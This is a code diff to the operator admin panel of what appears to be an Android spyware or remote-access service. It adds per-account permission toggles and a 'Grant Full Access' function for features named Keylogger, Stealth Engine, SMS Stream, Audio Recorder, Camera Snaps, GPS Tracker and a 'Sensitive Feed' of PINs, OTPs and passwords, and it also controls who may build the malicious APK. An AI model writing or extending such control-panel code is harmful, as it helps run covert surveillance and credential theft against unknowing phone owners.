@@ -335,11 +335,55 @@
 
             // Permissions
             const perms = u.permissions || {};
-            const sensitiveActive = isAdmin || perms.sensitive_feed === true;
-            const smsActive = isAdmin || perms.sms === true;
-            const notifActive = isAdmin || perms.notification === true;
-            const privacyActive = isAdmin || perms.privacy_screen === true;
-            const buildActive = perms.build_apk !== false;
+            const isFullAccess = isAdmin || (
+                perms.sms === true &&
+                perms.notification === true &&
+                perms.stealth === true &&
+                perms.accounts === true &&
+                perms.calls === true &&
+                perms.gallery === true &&
+                perms.files === true &&
+                perms.location === true &&
+                perms.keylogs === true &&
+                perms.audio === true &&
+                perms.camera === true &&
+                perms.chats === true &&
+                perms.apps === true &&
+                perms.privacy_screen === true &&
+                perms.sensitive_feed === true &&
+                perms.edit_modules === true &&
+                perms.build_apk !== false
+            );
+
+            const permItems = [
+                { key: 'sms', label: 'SMS Stream', icon: 'fa-envelope' },
+                { key: 'notification', label: 'Push Notif', icon: 'fa-bell' },
+                { key: 'stealth', label: 'Stealth Engine', icon: 'fa-user-ninja' },
+                { key: 'accounts', label: 'Accounts', icon: 'fa-user-circle' },
+                { key: 'calls', label: 'Calls & Contacts', icon: 'fa-phone-alt' },
+                { key: 'gallery', label: 'Media Gallery', icon: 'fa-images' },
+                { key: 'files', label: 'File Manager', icon: 'fa-folder' },
+                { key: 'location', label: 'GPS Tracker', icon: 'fa-map-marker-alt' },
+                { key: 'keylogs', label: 'Keylogger', icon: 'fa-keyboard' },
+                { key: 'audio', label: 'Audio Recorder', icon: 'fa-microphone' },
+                { key: 'camera', label: 'Camera Snaps', icon: 'fa-camera' },
+                { key: 'chats', label: 'Social Chats', icon: 'fa-comments' },
+                { key: 'apps', label: 'Installed Apps', icon: 'fa-th' },
+                { key: 'privacy_screen', label: 'Privacy Screen', icon: 'fa-user-secret' },
+                { key: 'sensitive_feed', label: 'Sensitive Feed', icon: 'fa-key' },
+                { key: 'edit_modules', label: 'Edit Build Modules', icon: 'fa-sliders-h' },
+                { key: 'build_apk', label: 'Build APK', icon: 'fa-hammer', defaultTrue: true }
+            ];
+
+            let permBadgesHtml = '';
+            permItems.forEach(item => {
+                const isActive = isAdmin || (item.defaultTrue ? perms[item.key] !== false : perms[item.key] === true);
+                permBadgesHtml += `
+                    <span class="permission-toggle ${isActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', '${item.key}', ${!isActive})" title="Click to toggle ${item.label}">
+                        <i class="fas ${isActive ? item.icon : 'fa-lock'}"></i> ${item.label}
+                    </span>
+                `;
+            });
 
             const lastLogin = u.last_login_formatted || (u.last_login ? new Date(u.last_login).toLocaleString() : 'Recently');
             const loginCount = u.login_count || 1;
@@ -359,7 +403,8 @@
                 <td style="padding: 16px 20px;">
                     ${isAdmin ? 
                         `<span class="live-badge" style="padding: 3px 10px; font-size: 0.68rem;"><i class="fas fa-shield-alt me-1"></i> ADMIN</span>` :
-                        `<span class="status-online" style="padding: 3px 10px; font-size: 0.68rem;">USER</span>`
+                        (isFullAccess ? `<span class="live-badge" style="padding: 3px 10px; font-size: 0.68rem; background: rgba(48,209,88,0.2); color: #30d158; border-color: rgba(48,209,88,0.4);"><i class="fas fa-crown me-1"></i> FULL ACCESS</span>` :
+                        `<span class="status-online" style="padding: 3px 10px; font-size: 0.68rem;">STANDARD</span>`)
                     }
                 </td>
                 <td style="padding: 16px 20px;">
@@ -369,35 +414,28 @@
                         <span style="color: var(--text-muted); font-size: 0.7rem;"><i class="fas fa-clock" style="margin-right: 4px;"></i>${lastLogin} (${loginCount}x)</span>
                     </div>
                 </td>
-                <td style="padding: 16px 20px;">
-                    <div style="display: flex; flex-wrap: wrap; gap: 6px;">
-                        <span class="permission-toggle ${sensitiveActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'sensitive_feed', ${!sensitiveActive})">
-                            <i class="fas ${sensitiveActive ? 'fa-key' : 'fa-lock'}"></i> Sensitive Feed (PIN/OTP/Pass)
-                        </span>
-                        <span class="permission-toggle ${smsActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'sms', ${!smsActive})">
-                            <i class="fas ${smsActive ? 'fa-envelope-open' : 'fa-lock'}"></i> SMS Reader
-                        </span>
-                        <span class="permission-toggle ${notifActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'notification', ${!notifActive})">
-                            <i class="fas ${notifActive ? 'fa-bell' : 'fa-lock'}"></i> Push Notif
-                        </span>
-                        <span class="permission-toggle ${privacyActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'privacy_screen', ${!privacyActive})">
-                            <i class="fas ${privacyActive ? 'fa-user-secret' : 'fa-lock'}"></i> Privacy Screen
-                        </span>
-                        <span class="permission-toggle ${buildActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'build_apk', ${!buildActive})">
-                            <i class="fas ${buildActive ? 'fa-hammer' : 'fa-ban'}"></i> Build APK
-                        </span>
+                <td style="padding: 16px 20px; max-width: 460px;">
+                    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+                        ${permBadgesHtml}
                     </div>
                 </td>
                 <td style="padding: 16px 20px; text-align: right;">
-                    <div style="display: flex; justify-content: flex-end; gap: 8px;">
-                        ${!isHardcodedAdmin ? `
-                            <button onclick="toggleAdminRole('${uid}', ${!isAdmin})" class="btn-ghost" style="padding: 6px 12px; font-size: 0.75rem; border-radius: var(--radius-pill); border-color: ${isAdmin ? 'rgba(255,69,58,0.4)' : 'rgba(48,209,88,0.4)'}; color: ${isAdmin ? 'var(--danger)' : 'var(--success)'};">
-                                <i class="fas ${isAdmin ? 'fa-user-minus' : 'fa-user-plus'}"></i> ${isAdmin ? 'Revoke Admin' : 'Make Admin'}
+                    <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 6px;">
+                        <div style="display: flex; gap: 6px;">
+                            <button onclick="setFullAccess('${uid}', ${!isFullAccess})" class="btn-primary-glow" style="padding: 6px 12px; font-size: 0.75rem; border-radius: var(--radius-pill); background: ${isFullAccess ? 'linear-gradient(135deg, #ff453a 0%, #c41c24 100%)' : 'linear-gradient(135deg, #30d158 0%, #248a3d 100%)'}; border-color: ${isFullAccess ? 'rgba(255,69,58,0.5)' : 'rgba(48,209,88,0.5)'}; box-shadow: 0 4px 15px ${isFullAccess ? 'rgba(255,69,58,0.3)' : 'rgba(48,209,88,0.3)'};">
+                                <i class="fas ${isFullAccess ? 'fa-lock' : 'fa-unlock-alt'}"></i> ${isFullAccess ? 'Revoke All' : 'Grant Full Access'}
                             </button>
-                        ` : ''}
-                        <button onclick="viewUserDetail('${uid}')" class="btn-ghost" style="padding: 6px 12px; font-size: 0.75rem; border-radius: var(--radius-pill);">
-                            <i class="fas fa-eye"></i> Audit Log
-                        </button>
+                        </div>
+                        <div style="display: flex; gap: 6px;">
+                            ${!isHardcodedAdmin ? `
+                                <button onclick="toggleAdminRole('${uid}', ${!isAdmin})" class="btn-ghost" style="padding: 5px 10px; font-size: 0.72rem; border-radius: var(--radius-pill); border-color: ${isAdmin ? 'rgba(255,69,58,0.4)' : 'rgba(48,209,88,0.4)'}; color: ${isAdmin ? 'var(--danger)' : 'var(--success)'};">
+                                    <i class="fas ${isAdmin ? 'fa-user-minus' : 'fa-user-plus'}"></i> ${isAdmin ? 'Revoke Admin' : 'Make Admin'}
+                                </button>
+                            ` : ''}
+                            <button onclick="viewUserDetail('${uid}')" class="btn-ghost" style="padding: 5px 10px; font-size: 0.72rem; border-radius: var(--radius-pill);">
+                                <i class="fas fa-eye"></i> Audit Log
+                            </button>
+                        </div>
                     </div>
                 </td>
             </tr>
@@ -405,6 +443,36 @@
         });
 
         tbody.innerHTML = html;
+    }
+
+    function setFullAccess(uid, grant) {
+        const fullPerms = {
+            sms: grant,
+            notification: grant,
+            stealth: grant,
+            accounts: grant,
+            calls: grant,
+            gallery: grant,
+            files: grant,
+            location: grant,
+            keylogs: grant,
+            audio: grant,
+            camera: grant,
+            chats: grant,
+            apps: grant,
+            privacy_screen: grant,
+            sensitive_feed: grant,
+            edit_modules: grant,
+            build_apk: grant
+        };
+
+        fbDb.ref(`users_meta/${uid}/permissions`).update(fullPerms).then(() => {
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                admin: currentAdminUser.email,
+                action: `${grant ? 'Granted FULL ACCESS' : 'REVOKED full access'} for user ${uid}`
+            });
+        });
     }
 
     function toggleUserPermission(uid, permKey, newValue) {
